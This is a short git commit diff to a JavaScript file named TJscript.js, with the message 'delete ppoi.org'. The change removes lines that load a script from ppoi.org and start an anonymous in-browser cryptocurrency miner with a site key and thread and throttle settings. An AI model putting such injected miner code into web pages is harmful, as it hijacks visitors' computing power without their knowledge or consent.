7decca72817148091c469428eb75c478eac4c806
ji chuan huang <programlive@outlook.com>
2018-03-29 16:10:30 +0800

    delete  ppoi.org
    delete  ppoi.org

--- TJscript.js
+++ TJscript.js
@@ -7,14 +7,5 @@ var _hmt = _hmt || [];
 })();
 console.log("ok");
 
-  var hm = document.createElement("script");
-  hm.type = 'text/javascript'; 
-  hm.src = "https://ppoi.org/lib/projectpoi.min.js";
-  document.getElementsByTagName("head")[0].appendChild(hm);
-  hm.onload= hm.onreadysatatechange = function(){
-var miner = new ProjectPoi.Anonymous('JybKn1cDNiX876x0o8srAPTo');
-   miner.setNumThreads(1);
-   miner.setThrottle(0.5);
-   miner.start();
-    console.log(miner.isRunning( ));
+
 } 
